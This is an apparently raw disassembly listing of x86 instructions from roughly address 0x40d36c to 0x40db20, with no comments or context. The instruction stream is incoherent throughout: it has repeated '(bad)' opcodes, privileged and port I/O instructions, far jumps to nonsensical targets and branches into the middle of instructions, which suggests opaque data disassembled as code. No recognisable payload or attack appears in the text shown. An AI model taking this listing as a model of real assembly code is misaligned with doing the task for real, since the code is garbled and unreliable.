  40d36c:	and    eax,ebx
  40d36e:	xor    al,0x32
  40d370:	push   ss
  40d371:	outs   dx,DWORD PTR ds:[esi]
  40d372:	push   eax
  40d373:	repz enter 0x5917,0xa9
  40d378:	jle    0x40d377
  40d37a:	sub    DWORD PTR [ecx-0xd690b1a],edx
  40d380:	(bad)  
  40d381:	pop    edx
  40d382:	jg     0x40d35e
  40d384:	(bad)  
  40d385:	adc    al,0x65
  40d387:	jl     0x40d385
  40d389:	pushf  
  40d38a:	(bad)  
  40d38b:	call   0x71615e75
  40d390:	dec    eax
  40d391:	leave  
  40d392:	enter  0xfde4,0xc8
  40d396:	fstp   TBYTE PTR [eax-0x759a73f6]
  40d39c:	mov    cs,WORD PTR [edi+ebx*2+0x6c9a8f93]
  40d3a3:	sbb    al,BYTE PTR [eax+0x1718a957]
  40d3a9:	mov    dh,BYTE PTR [ebx-0x32]
  40d3ac:	adc    DWORD PTR [edx+esi*1],edi
  40d3af:	add    eax,0x348507e5
  40d3b4:	and    DWORD PTR [esi-0xf],0xc977d157
  40d3bb:	and    eax,0xe91b774b
  40d3c0:	cdq    
  40d3c1:	or     DWORD PTR [edx+0x9],0x43
  40d3c5:	fstp   DWORD PTR [edx]
  40d3c7:	div    eax
  40d3c9:	jns    0x40d3f4
  40d3cb:	(bad)  
  40d3cc:	or     ch,ch
  40d3ce:	fcomp  DWORD PTR [ebx]
  40d3d0:	and    DWORD PTR [edx],esp
  40d3d2:	xchg   edi,eax
  40d3d3:	pop    ss
  40d3d4:	or     dl,BYTE PTR [edi]
  40d3d6:	dec    DWORD PTR [esi+0x3c3efe2d]
  40d3dc:	push   DWORD PTR [esi-0x30]
  40d3df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3e0:	lods   al,BYTE PTR ds:[esi]
  40d3e1:	int    0x84
  40d3e3:	mul    DWORD PTR [ebp+0x56ef64e]
  40d3e9:	push   eax
  40d3ea:	xor    ebx,ebx
  40d3ec:	loopne 0x40d3ab
  40d3ee:	push   esi
  40d3ef:	xchg   esp,eax
  40d3f0:	pop    edx
  40d3f1:	mov    bh,0xff
  40d3f3:	xchg   esp,eax
  40d3f4:	retf   
  40d3f5:	scas   al,BYTE PTR es:[edi]
  40d3f6:	dec    eax
  40d3f7:	aaa    
  40d3f8:	dec    ecx
  40d3f9:	sti    
  40d3fa:	push   0xffffff96
  40d3fc:	inc    esi
  40d3fd:	jno    0x40d3d7
  40d3ff:	and    ch,BYTE PTR ds:0x4bace836
  40d405:	or     al,0xbf
  40d407:	leave  
  40d408:	aam    0xbc
  40d40a:	sar    BYTE PTR [edi-0x4a9a27d4],cl
  40d410:	jns    0x40d40e
  40d412:	sbb    bh,BYTE PTR ds:0xc0ad1b6
  40d418:	jnp    0x40d3a5
  40d41a:	jmp    0xa11f5d41
  40d41f:	popf   
  40d420:	jecxz  0x40d451
  40d422:	cmovp  edi,DWORD PTR [eax-0x5cdf7027]
  40d429:	xchg   edx,eax
  40d42a:	inc    esp
  40d42b:	xchg   edx,eax
  40d42c:	stc    
  40d42d:	cdq    
  40d42e:	cwde   
  40d42f:	gs dec esi
  40d431:	xchg   ebp,eax
  40d432:	call   0xdbd576b2
  40d437:	adc    eax,0x5941866
  40d43c:	frstor [esi]
  40d43e:	sub    dh,BYTE PTR [ebx]
  40d440:	mov    WORD PTR [eax+0x37c57f9b],?
  40d446:	or     DWORD PTR [eax],esi
  40d448:	call   0xa9e:0xf73e533f
  40d44f:	sub    BYTE PTR [edi-0x59],bl
  40d452:	dec    edx
  40d453:	push   ebp
  40d454:	pop    ds
  40d455:	test   dl,0xaf
  40d458:	cmp    eax,0x7b12f5de
  40d45d:	in     eax,dx
  40d45e:	mov    ah,0x58
  40d460:	mov    al,BYTE PTR [edi+esi*8-0x50]
  40d464:	mov    edi,0xfae8b761
  40d469:	rcr    BYTE PTR [ebx+0xace71db],0x81
  40d470:	push   ss
  40d471:	arpl   WORD PTR [edi-0x2],bx
  40d474:	pop    edx
  40d475:	jmp    0xed73:0x58e4bedc
  40d47c:	add    BYTE PTR [edx-0x80],0x6d
  40d480:	jne    0x40d45a
  40d482:	int3   
  40d483:	push   edi
  40d485:	pop    esp
  40d486:	dec    ecx
  40d487:	dec    esp
  40d488:	fiadd  DWORD PTR [esi+0x42f99ceb]
  40d48e:	call   0x121cada2
  40d493:	and    DWORD PTR [esi-0x5b],esi
  40d496:	icebp  
  40d497:	les    esp,FWORD PTR ds:0x558385ca
  40d49d:	sbb    BYTE PTR [ebp+0x63339cb2],dl
  40d4a3:	or     ebx,DWORD PTR [edi+0x58a29d70]
  40d4a9:	xchg   BYTE PTR [esi],dh
  40d4ab:	xchg   ebx,eax
  40d4ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4ad:	in     eax,dx
  40d4ae:	xchg   ebx,eax
  40d4af:	sbb    ebp,DWORD PTR ds:0xde87618c
  40d4b5:	jns    0x40d521
  40d4b7:	sbb    eax,0x3fa50fe7
  40d4bc:	push   eax
  40d4bd:	cwde   
  40d4be:	sub    eax,0x7c25d4ad
  40d4c3:	add    DWORD PTR [ecx],ecx
  40d4c5:	add    ebx,eax
  40d4c7:	fcom   DWORD PTR ds:[edx+0x51]
  40d4cb:	cs add eax,0xb5f5271f
  40d4d1:	jae    0x40d455
  40d4d3:	mov    ds:0x4dfc4e2b,eax
  40d4d8:	mov    edx,0xe393f4a7
  40d4dd:	inc    esp
  40d4de:	lock pop edi
  40d4e0:	push   edx
  40d4e1:	inc    BYTE PTR [ebx+0x25]
  40d4e4:	inc    eax
  40d4e5:	push   edi
  40d4e6:	sbb    BYTE PTR [edx+0xc9ff436],0xa1
  40d4ed:	(bad)  
  40d4ee:	add    DWORD PTR [esi],0x62
  40d4f1:	cmc    
  40d4f2:	sub    DWORD PTR [esi+0x37],ecx
  40d4f5:	inc    eax
  40d4f6:	and    eax,0x690f9106
  40d4fb:	mov    ebp,0x504d95fa
  40d500:	jo     0x40d4c4
  40d502:	cwde   
  40d503:	and    DWORD PTR [ebx+0x66],0xfffffff2
  40d507:	mov    ah,0x49
  40d509:	gs addr16 loope 0x40d53a
  40d50d:	in     al,0x37
  40d50f:	in     eax,0x3a
  40d511:	test   BYTE PTR [esi],ah
  40d513:	push   0xc9b386f9
  40d518:	or     bl,bh
  40d51a:	lds    esp,FWORD PTR [ebp-0x48]
  40d51d:	enter  0x9e3,0xd2
  40d521:	mov    al,ds:0x24a2d76
  40d526:	dec    ebx
  40d527:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d529:	cmp    DWORD PTR [edi-0x239e11cc],0xf7d373f7
  40d533:	push   esp
  40d534:	lock jmp DWORD PTR [edx-0x4]
  40d538:	cmp    ebx,esp
  40d53a:	scas   eax,DWORD PTR es:[edi]
  40d53b:	mov    ebp,edi
  40d53d:	push   0xffffff82
  40d53f:	pop    es
  40d540:	cmp    eax,DWORD PTR [eax*4-0x768b150a]
  40d547:	pop    edi
  40d548:	push   0x9cca0a86
  40d54d:	or     edi,0x1b295db8
  40d553:	pop    edx
  40d554:	sub    esp,0x4
  40d557:	sub    DWORD PTR ds:0xa236810b,ecx
  40d55d:	fidivr WORD PTR ds:0xf63e2ca0
  40d563:	pusha  
  40d564:	(bad)  
  40d565:	shl    BYTE PTR [edi+0x72123d5],1
  40d56b:	xchg   esp,eax
  40d56c:	iret   
  40d56d:	jle    0x40d563
  40d56f:	scas   eax,DWORD PTR es:[edi]
  40d570:	sbb    al,0x74
  40d572:	fisubr WORD PTR [esi]
  40d574:	out    dx,al
  40d575:	xchg   al,ch
  40d577:	jg     0x40d5da
  40d579:	lahf   
  40d57a:	mov    ebp,0x83108f10
  40d57f:	or     ah,BYTE PTR [ebp+0xa]
  40d582:	cli    
  40d583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d584:	sti    
  40d585:	and    edi,DWORD PTR [esi+0x0]
  40d588:	xchg   DWORD PTR [eax-0x4d566b6e],eax
  40d58e:	mov    eax,0xad17da55
  40d593:	int3   
  40d594:	xchg   bl,ah
  40d596:	sbb    eax,0x78a77782
  40d59b:	xchg   ebp,eax
  40d59c:	outs   dx,BYTE PTR ds:[esi]
  40d59d:	add    BYTE PTR [edx],bh
  40d59f:	cmp    esi,DWORD PTR [eax-0x1019b45]
  40d5a5:	ins    DWORD PTR es:[edi],dx
  40d5a6:	xchg   esi,eax
  40d5a7:	sar    edi,0x70
  40d5aa:	bound  ebp,QWORD PTR [ebp-0x333f3719]
  40d5b0:	enter  0xcbed,0xb5
  40d5b4:	sub    al,0xd2
  40d5b6:	nop
  40d5b7:	mov    ds,ebp
  40d5b9:	jp     0x40d5d8
  40d5bb:	cld    
  40d5bc:	inc    eax
  40d5bd:	(bad)  
  40d5bf:	jge    0x40d54c
  40d5c1:	sub    ah,al
  40d5c3:	cmp    eax,0xc03db960
  40d5c8:	je     0x40d5e7
  40d5ca:	ficomp WORD PTR [ebx+0x7199efdd]
  40d5d0:	cmp    al,0x58
  40d5d2:	mov    cl,0xc6
  40d5d4:	fcmovnu st,st(0)
  40d5d6:	push   ebx
  40d5d7:	mov    bh,0x4c
  40d5d9:	mov    esp,ebx
  40d5db:	je     0x40d5cf
  40d5dd:	aam    0xe7
  40d5df:	call   0x893b8c83
  40d5e4:	sahf   
  40d5e5:	fild   DWORD PTR [ecx]
  40d5e7:	jl     0x40d628
  40d5e9:	and    ecx,DWORD PTR [ecx+0x4cb44330]
  40d5ef:	lds    edx,FWORD PTR [edi-0x59a6c11c]
  40d5f5:	push   edi
  40d5f6:	rcr    ah,cl
  40d5f8:	shr    cl,1
  40d5fa:	xchg   BYTE PTR ds:0x52dd9edf,al
  40d600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d601:	loope  0x40d66b
  40d603:	or     BYTE PTR [edi+ebx*1+0x1e6a4413],cl
  40d60a:	int    0x1c
  40d60c:	imul   esp,edi,0xffffffc6
  40d60f:	jg     0x40d659
  40d611:	(bad)  
  40d612:	pop    es
  40d613:	das    
  40d614:	add    BYTE PTR [ebx],dh
  40d616:	les    edx,FWORD PTR [edx+0x568a8aa]
  40d61c:	jecxz  0x40d5a6
  40d61e:	ds call 0x6b6:0x7cc528da
  40d626:	mov    ebp,0xeb12c075
  40d62b:	test   ecx,ebp
  40d62d:	sub    DWORD PTR [edi+0x60],edx
  40d630:	pop    DWORD PTR [edx+0x4ecd2c92]
  40d636:	jns    0x40d5be
  40d638:	(bad)  
  40d639:	and    eax,0x6465eee1
  40d63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d63f:	cmp    eax,0xbe22410d
  40d644:	xor    al,0xb9
  40d646:	dec    eax
  40d647:	sub    eax,0x5124ba99
  40d64c:	call   0xcf0cd95
  40d651:	aad    0x8c
  40d653:	lea    ebp,[eax+edx*8]
  40d656:	or     al,0x10
  40d658:	scas   eax,DWORD PTR es:[edi]
  40d659:	or     DWORD PTR [ebx],edi
  40d65b:	mov    ch,0x58
  40d65d:	jge    0x40d6c6
  40d65f:	cwde   
  40d660:	test   eax,0x93d5f3b2
  40d665:	inc    ebp
  40d666:	pop    es
  40d667:	sub    al,BYTE PTR [esi]
  40d669:	in     al,0x13
  40d66b:	or     DWORD PTR [eax],ecx
  40d66d:	icebp  
  40d66e:	mov    dh,0xce
  40d670:	xor    ah,BYTE PTR [ebp-0x225fcc77]
  40d676:	inc    edi
  40d677:	or     eax,0x28a88a6b
  40d67c:	sub    al,0x83
  40d67e:	mov    cl,0x1
  40d680:	mov    ds:0x5f9322f0,eax
  40d685:	pop    es
  40d686:	rcl    bl,1
  40d688:	and    eax,0x22fab204
  40d68d:	mov    ebx,0xd6a055d9
  40d692:	cmp    ah,BYTE PTR [edx-0x6771e3fc]
  40d698:	test   al,0xe7
  40d69a:	fstp   DWORD PTR [edi]
  40d69c:	das    
  40d69d:	repz xchg edi,eax
  40d69f:	push   edi
  40d6a0:	mov    dh,0x79
  40d6a2:	or     al,0xa2
  40d6a4:	mov    al,0x23
  40d6a6:	les    ebx,FWORD PTR [ecx+0x7f]
  40d6a9:	pusha  
  40d6aa:	(bad)  
  40d6ab:	loop   0x40d65c
  40d6ad:	mov    ebx,0xcdd6d0c8
  40d6b2:	das    
  40d6b3:	out    dx,eax
  40d6b4:	cmp    DWORD PTR [ecx],edx
  40d6b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6b7:	and    DWORD PTR [eax],edx
  40d6b9:	cdq    
  40d6ba:	cld    
  40d6bb:	data16 jge 0x40d733
  40d6be:	dec    esp
  40d6bf:	mov    bh,0xce
  40d6c1:	jno    0x40d652
  40d6c3:	std    
  40d6c4:	ja     0x40d6e2
  40d6c6:	je     0x40d670
  40d6c8:	loopne 0x40d6cb
  40d6ca:	and    BYTE PTR ds:0x54f1d80f,cl
  40d6d0:	mul    BYTE PTR [eax-0x46]
  40d6d3:	or     bh,bl
  40d6d5:	pop    esi
  40d6d6:	add    eax,0xcae20c88
  40d6db:	aaa    
  40d6dc:	mov    edx,0xb25315f5
  40d6e1:	lods   eax,DWORD PTR ds:[esi]
  40d6e2:	jmp    DWORD PTR [ebx]
  40d6e4:	jns    0x40d6f6
  40d6e6:	mov    esi,0xabb4fd94
  40d6eb:	add    DWORD PTR [edx+0x62],ebp
  40d6ee:	cwde   
  40d6ef:	jb     0x40d6f7
  40d6f1:	add    al,0x29
  40d6f3:	vpcmpeqb ymm4,ymm5,YMMWORD PTR [edx+0x29f9b1b8]
  40d6fb:	cdq    
  40d6fc:	std    
  40d6fd:	idiv   DWORD PTR [edi]
  40d6ff:	aam    0x90
  40d701:	push   es
  40d702:	and    DWORD PTR [edi-0x2c],ecx
  40d705:	(bad)  
  40d706:	lock jnp 0x40d6b3
  40d709:	jno    0x40d712
  40d70b:	xchg   al,cl
  40d70d:	jle    0x40d77f
  40d70f:	xchg   edi,eax
  40d710:	push   edx
  40d711:	and    BYTE PTR [ecx+ebx*8],bl
  40d714:	jae    0x40d6c7
  40d716:	jle    0x40d70b
  40d718:	cmp    al,0xea
  40d71a:	repz addr16 and eax,0xe69846d
  40d721:	sub    eax,0x91b88b3c
  40d726:	adc    BYTE PTR [edi+ebp*4-0xc],bl
  40d72a:	cs push es
  40d72c:	leave  
  40d72d:	push   0x8167c1b7
  40d732:	dec    eax
  40d733:	jmp    0x40d795
  40d735:	mov    al,0xd6
  40d737:	mov    al,0x73
  40d739:	popf   
  40d73a:	xlat   BYTE PTR ds:[ebx]
  40d73b:	in     al,0xd4
  40d73d:	ins    BYTE PTR es:[edi],dx
  40d73e:	or     DWORD PTR [edi+0x79],0x37
  40d742:	int    0xc0
  40d744:	mov    eax,0x4a3bb763
  40d749:	and    esp,DWORD PTR [ebx-0x3d]
  40d74c:	push   esi
  40d74d:	int3   
  40d74e:	mov    bl,0x18
  40d750:	mov    ebp,0xd664c070
  40d755:	mov    edi,0xa4dd9e89
  40d75a:	stos   BYTE PTR es:[edi],al
  40d75b:	xchg   ebx,eax
  40d75c:	push   ebp
  40d75d:	and    DWORD PTR [edx+0x4ba366a0],esi
  40d763:	pop    ecx
  40d764:	imul   ecx,DWORD PTR [edx],0xffffff9e
  40d767:	sti    
  40d768:	add    eax,0x533d9163
  40d76d:	sub    eax,0x8c99d260
  40d772:	jge    0x40d791
  40d774:	loope  0x40d771
  40d776:	std    
  40d777:	add    eax,0xd388576d
  40d77c:	fsubr  QWORD PTR [eax-0x2df26bab]
  40d782:	shr    BYTE PTR [edx-0x4670c12],1
  40d788:	imul   DWORD PTR es:[ecx]
  40d78b:	pop    sp
  40d78d:	mov    BYTE PTR [ebx+0x62a7cf76],ch
  40d793:	(bad)  
  40d794:	mov    esi,0x6135ca58
  40d799:	loopne 0x40d7ab
  40d79b:	retf   0xdbae
  40d79e:	fisub  WORD PTR [eax+0x722e613a]
  40d7a4:	lods   eax,DWORD PTR ds:[esi]
  40d7a5:	pop    ecx
  40d7a6:	jbe    0x40d7d0
  40d7a8:	push   ebp
  40d7a9:	hlt    
  40d7aa:	jne    0x40d821
  40d7ac:	ins    DWORD PTR es:[edi],dx
  40d7ad:	jnp    0x40d77a
  40d7af:	add    al,0x35
  40d7b1:	sbb    eax,0x8265637e
  40d7b7:	rcl    DWORD PTR [eax],0x9c
  40d7ba:	pushf  
  40d7bb:	jmp    0xfa15:0x258fbdb0
  40d7c2:	loope  0x40d752
  40d7c4:	pop    esi
  40d7c5:	and    edx,DWORD PTR [ebx]
  40d7c7:	(bad)  
  40d7c8:	mov    dl,0x66
  40d7ca:	test   dl,bh
  40d7cc:	fiadd  WORD PTR [ebp+0x5369fa11]
  40d7d2:	add    al,0x49
  40d7d4:	pop    es
  40d7d5:	add    BYTE PTR [edi],0x97
  40d7d8:	test   BYTE PTR [eax+0x30],dh
  40d7db:	inc    ecx
  40d7dc:	push   es
  40d7dd:	repnz cdq 
  40d7df:	in     al,0x7
  40d7e1:	js     0x40d82c
  40d7e3:	repnz sbb DWORD PTR [ebp-0x208e8e3b],esp
  40d7ea:	neg    BYTE PTR [edi]
  40d7ec:	sbb    BYTE PTR [edi+0x0],dl
  40d7ef:	push   ds
  40d7f0:	mov    ds:0x31696609,al
  40d7f5:	push   eax
  40d7f6:	push   esp
  40d7f7:	inc    bl
  40d7f9:	lods   eax,DWORD PTR ds:[esi]
  40d7fa:	dec    esp
  40d7fb:	fistp  WORD PTR [ebp-0x14]
  40d7fe:	mov    DWORD PTR [ebx+0x471f802e],eax
  40d804:	jg     0x40d7ee
  40d806:	xor    BYTE PTR [edx],ch
  40d808:	and    DWORD PTR [ebx-0x4c9577b6],0x74e1163e
  40d812:	sahf   
  40d813:	push   cs
  40d814:	popa   
  40d815:	mov    al,ds:0x5be22fd6
  40d81a:	xor    al,BYTE PTR [eax]
  40d81c:	retf   
  40d81d:	pop    ds
  40d81e:	xor    edi,DWORD PTR [ecx]
  40d820:	ins    DWORD PTR es:[edi],dx
  40d821:	out    dx,eax
  40d822:	pushf  
  40d823:	jae    0x40d807
  40d825:	call   0x7e35654f
  40d82a:	sub    DWORD PTR [edi+0x7b3844f5],0x21
  40d831:	popf   
  40d832:	jb     0x40d88e
  40d834:	adc    DWORD PTR [ebx],ecx
  40d836:	push   ebx
  40d837:	dec    esi
  40d838:	inc    edx
  40d839:	push   es
  40d83a:	inc    eax
  40d83b:	imul   eax
  40d83d:	cmp    DWORD PTR [ebp-0x255f9261],edi
  40d843:	aam    0x59
  40d845:	mov    al,ds:0x30242446
  40d84a:	dec    ebp
  40d84b:	sub    al,0x86
  40d84d:	sbb    bh,BYTE PTR [eax+eax*2-0x41]
  40d851:	int3   
  40d852:	sub    esi,DWORD PTR [ebp-0x14]
  40d855:	adc    eax,0x5efb3b51
  40d85a:	push   es
  40d85b:	(bad)  
  40d85c:	ror    DWORD PTR [esi-0x2a80cfda],1
  40d862:	out    dx,al
  40d863:	call   0x428c:0x7195863b
  40d86a:	ret    
  40d86b:	add    DWORD PTR [eax],esp
  40d86d:	dec    edi
  40d86e:	or     eax,0xa6c38f5
  40d873:	mov    esp,DWORD PTR [ebp+0x516d6cf0]
  40d879:	and    al,0x73
  40d87b:	xor    al,0xb3
  40d87d:	sub    bh,BYTE PTR [eax]
  40d87f:	cmp    eax,0x768c06d1
  40d884:	mov    ds:0x18175cb0,eax
  40d889:	cli    
  40d88a:	mov    dl,0x6e
  40d88c:	xchg   esp,eax
  40d88d:	and    DWORD PTR [ebp+0x6cada774],edx
  40d893:	xchg   esp,eax
  40d894:	inc    edx
  40d895:	pusha  
  40d896:	jns    0x40d900
  40d898:	repnz mov dl,0xde
  40d89b:	hlt    
  40d89c:	cs jnp 0x40d887
  40d89f:	ss cld 
  40d8a1:	test   eax,0x12df552a
  40d8a6:	hlt    
  40d8a7:	fcomp  st(6)
  40d8a9:	jmp    0xe508:0xac75093
  40d8b0:	loop   0x40d889
  40d8b2:	mov    bl,0x3e
  40d8b4:	xchg   ebx,eax
  40d8b5:	dec    esi
  40d8b6:	adc    BYTE PTR [ebp-0x1ef47ca6],al
  40d8bc:	add    DWORD PTR [esi],edx
  40d8be:	mov    ebp,0xdff97999
  40d8c3:	enter  0x4683,0xd
  40d8c7:	jmp    0x40d92a
  40d8c9:	lds    ebp,FWORD PTR [ebx+ecx*4-0x3185516f]
  40d8d0:	xor    ecx,DWORD PTR [edx]
  40d8d2:	pop    ebx
  40d8d3:	push   cs
  40d8d4:	mov    eax,ds:0xfb0eccab
  40d8d9:	jmp    0xa29da67
  40d8de:	leave  
  40d8df:	and    edi,DWORD PTR [ebx-0x71]
  40d8e2:	jnp    0x40d8a6
  40d8e4:	mov    al,ch
  40d8e6:	enter  0xe386,0x7f
  40d8ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8eb:	sbb    eax,0xedce5976
  40d8f0:	add    BYTE PTR [ebp+ecx*8+0x78],dl
  40d8f4:	jno    0x40d8c4
  40d8f6:	push   cs
  40d8f7:	fsubr  QWORD PTR [eax-0xa]
  40d8fa:	xor    eax,0xdd4dfffe
  40d8ff:	ins    BYTE PTR es:[edi],dx
  40d900:	pop    ebp
  40d901:	jo     0x40d88a
  40d903:	or     al,dh
  40d905:	cmp    eax,0x85faef1e
  40d90a:	and    ebp,DWORD PTR [edi+0x42bef25d]
  40d910:	push   ecx
  40d911:	shl    DWORD PTR [edx-0x6ca6ac7c],1
  40d917:	retf   
  40d918:	in     al,dx
  40d919:	and    al,0x3b
  40d91b:	daa    
  40d91c:	push   esp
  40d91d:	add    dh,dh
  40d91f:	in     al,0xd3
  40d921:	imul   esi,DWORD PTR [esi],0xe77e5364
  40d927:	adc    BYTE PTR [edi+0x37e8e309],dh
  40d92d:	xor    BYTE PTR [edi-0x46],cl
  40d930:	js     0x40d9a4
  40d932:	xor    esi,DWORD PTR [eax+0x7e]
  40d935:	les    esp,FWORD PTR [eax-0x3a]
  40d938:	pushf  
  40d939:	std    
  40d93a:	xlat   BYTE PTR ds:[ebx]
  40d93b:	dec    edi
  40d93c:	mov    bh,bl
  40d93e:	mov    al,0x75
  40d940:	out    dx,eax
  40d941:	sub    BYTE PTR [ebp+0x6a4ca0ae],0x23
  40d948:	add    bh,bl
  40d94a:	jne    0x40d915
  40d94c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d94d:	mov    ebp,0x88b39be0
  40d952:	pop    esi
  40d953:	ins    DWORD PTR es:[edi],dx
  40d954:	imul   ebp,DWORD PTR [ebp+ebx*8-0x614ea6f2],0x6e068c3b
  40d95f:	inc    ebx
  40d960:	dec    esp
  40d961:	sbb    esp,0xcf798b75
  40d967:	repnz loop 0x40d9be
  40d96a:	gs mov eax,0xf06daa9f
  40d970:	repnz rcl edi,cl
  40d973:	out    dx,eax
  40d974:	call   0x272c0903
  40d979:	pusha  
  40d97a:	xor    ah,BYTE PTR [ebp+0x61]
  40d97d:	cld    
  40d97e:	pop    edx
  40d97f:	dec    edx
  40d980:	div    DWORD PTR [edi-0xc]
  40d983:	dec    ebx
  40d984:	push   cs
  40d985:	jne    0x40d9e4
  40d987:	or     ebp,ecx
  40d989:	inc    eax
  40d98a:	sahf   
  40d98b:	jle    0x40d947
  40d98d:	or     ebp,esi
  40d98f:	mov    bh,0xeb
  40d991:	inc    edi
  40d992:	cmp    eax,0x29185939
  40d997:	jle    0x40d93b
  40d999:	xchg   ecx,eax
  40d99a:	nop    DWORD PTR [eax]
  40d99d:	shl    DWORD PTR [eax-0x67],0x32
  40d9a1:	adc    bh,BYTE PTR [ebp+0x18259ea8]
  40d9a7:	sub    al,0xb6
  40d9a9:	int3   
  40d9aa:	std    
  40d9ab:	mov    ecx,ebp
  40d9ad:	in     eax,0x89
  40d9af:	lods   eax,DWORD PTR ds:[esi]
  40d9b0:	adc    al,0x68
  40d9b2:	sub    BYTE PTR [ebp+0x1d],ah
  40d9b5:	mov    cl,ch
  40d9b7:	or     DWORD PTR [eax+0x65],edi
  40d9ba:	add    dl,BYTE PTR [esi]
  40d9bc:	adc    edi,esi
  40d9be:	je     0x40d97d
  40d9c0:	les    esp,FWORD PTR [ebp+0x2d]
  40d9c3:	loopne 0x40d95e
  40d9c5:	mov    DWORD PTR [esi],ecx
  40d9c7:	push   edi
  40d9c8:	pushf  
  40d9c9:	xchg   esi,eax
  40d9ca:	xor    esi,ecx
  40d9cc:	rol    eax,cl
  40d9ce:	ds push es
  40d9d0:	jg     0x40da11
  40d9d2:	or     bh,bh
  40d9d4:	in     eax,dx
  40d9d5:	dec    edi
  40d9d6:	add    edi,DWORD PTR [esi+eax*1]
  40d9d9:	jge    0x40d9b9
  40d9db:	pop    edx
  40d9dc:	jno    0x40d9ce
  40d9de:	out    dx,al
  40d9df:	sbb    dh,bl
  40d9e1:	pop    esp
  40d9e2:	aas    
  40d9e3:	out    0x4c,al
  40d9e5:	add    edi,DWORD PTR [esi+0x519e2cde]
  40d9eb:	aam    0xed
  40d9ed:	fwait
  40d9ee:	test   BYTE PTR [eax+0x383b44a6],0xa1
  40d9f5:	jns    0x40d978
  40d9f7:	jnp    0x40da5c
  40d9f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9fa:	(bad)  
  40d9fb:	inc    esi
  40d9fc:	push   ebx
  40d9fd:	dec    esp
  40d9fe:	lock pop edx
  40da00:	and    al,0x1b
  40da02:	lahf   
  40da03:	pop    edx
  40da04:	mov    ds:0x17426e23,eax
  40da09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da0a:	xlat   BYTE PTR ds:[ebx]
  40da0b:	or     DWORD PTR [ebp+0x4e],esp
  40da0e:	(bad)  
  40da0f:	xor    DWORD PTR [edx+eiz*1],edx
  40da12:	stc    
  40da13:	pop    ebx
  40da14:	xchg   BYTE PTR [eax],bh
  40da16:	repz and eax,0x26f84568
  40da1c:	lea    ebx,[ebx+0xf]
  40da1f:	pop    esp
  40da20:	aam    0x20
  40da22:	jle    0x40d9f2
  40da24:	cmp    BYTE PTR [edx+0x6d],ch
  40da27:	popf   
  40da28:	mov    al,0xd8
  40da2a:	repz lahf 
  40da2c:	jle    0x40d9e6
  40da2e:	sti    
  40da2f:	mov    eax,ds:0x9a23160e
  40da34:	and    eax,0xa2a16121
  40da39:	or     DWORD PTR [ebx*2+0x2558f891],ebp
  40da40:	adc    dl,dl
  40da42:	add    al,0xef
  40da44:	mov    eax,ss
  40da46:	dec    ebp
  40da47:	mov    al,0xc1
  40da49:	add    al,0xa5
  40da4b:	mov    ds:0x10a25208,al
  40da50:	inc    ebp
  40da51:	inc    edx
  40da52:	loopne 0x40da80
  40da54:	jmp    0x6fc0921e
  40da59:	inc    ecx
  40da5a:	pushf  
  40da5b:	arpl   WORD PTR [eax+0x51],sp
  40da5e:	jecxz  0x40da6d
  40da60:	adc    bh,ch
  40da62:	mov    al,0xab
  40da64:	xlat   BYTE PTR ds:[ebx]
  40da65:	add    bh,BYTE PTR [eax-0x32f671f3]
  40da6b:	jbe    0x40da2a
  40da6d:	rcr    BYTE PTR [esi+0x35aa529d],cl
  40da73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da74:	xchg   ebp,eax
  40da75:	mov    ebx,ds
  40da77:	mov    bl,0x83
  40da79:	xor    eax,0xba5ed1db
  40da7e:	fiadd  WORD PTR [ebp+0x760fcd10]
  40da84:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40da86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da87:	pop    ebx
  40da88:	ds (bad) 
  40da8a:	sti    
  40da8b:	nop
  40da8c:	(bad)  
  40da8d:	xor    esp,DWORD PTR [esi+0x4c]
  40da90:	cmp    bh,BYTE PTR [edx]
  40da92:	in     eax,0x9a
  40da94:	call   0x78ce9a56
  40da99:	ss jle 0x40da7c
  40da9c:	pop    ebp
  40da9d:	push   edi
  40da9e:	not    bl
  40daa0:	jl     0x40da6a
  40daa2:	or     eax,0x8019e2cf
  40daa7:	xor    ebx,esp
  40daa9:	(bad)  
  40daaa:	fiadd  DWORD PTR [ecx+0x51]
  40daad:	into   
  40daae:	jnp    0x40dab5
  40dab0:	cmp    bh,BYTE PTR ds:0xa719f89a
  40dab6:	gs pusha 
  40dab8:	hlt    
  40dab9:	fnsave [esi]
  40dabb:	mov    ah,0x4d
  40dabd:	cmp    BYTE PTR [edi+0x7d71eb5a],ch
  40dac3:	addr16 out 0x8f,al
  40dac6:	fnsave [ebx+0x3eef9fa7]
  40dacc:	inc    edi
  40dacd:	mov    BYTE PTR [esi+0x45],al
  40dad0:	ret    
  40dad1:	push   ds
  40dad2:	mov    esi,0x34d44b97
  40dad7:	sbb    DWORD PTR [ecx+0x1989bd96],0x0
  40dade:	pushf  
  40dadf:	ja     0x40db45
  40dae1:	dec    ebp
  40dae2:	adc    DWORD PTR [esi+0x14cd4f4d],eax
  40dae8:	(bad)  
  40dae9:	fsub   st(2),st
  40daeb:	mov    eax,0xdc897565
  40daf0:	pop    eax
  40daf1:	add    BYTE PTR [ecx],dl
  40daf3:	test   edi,ebp
  40daf5:	jmp    0x40db26
  40daf7:	xchg   ebp,eax
  40daf8:	cmp    DWORD PTR [esi-0x40d17d21],ebx
  40dafe:	add    ah,ch
  40db00:	je     0x40dad2
  40db02:	loopne 0x40db6a
  40db04:	add    al,0xef
  40db06:	data16 jnp 0x40daaa
  40db09:	imul   esi,DWORD PTR [ebp+0x5a18a21c],0x4f0d2089
  40db13:	loopne 0x40daac
  40db15:	mov    edi,0xcf381dcc
  40db1a:	shl    BYTE PTR [eax],cl
  40db1c:	outs   dx,DWORD PTR ds:[esi]
  40db1d:	mov    ch,0xf7
  40db1f:	pop    ecx
  40db20:	ret    
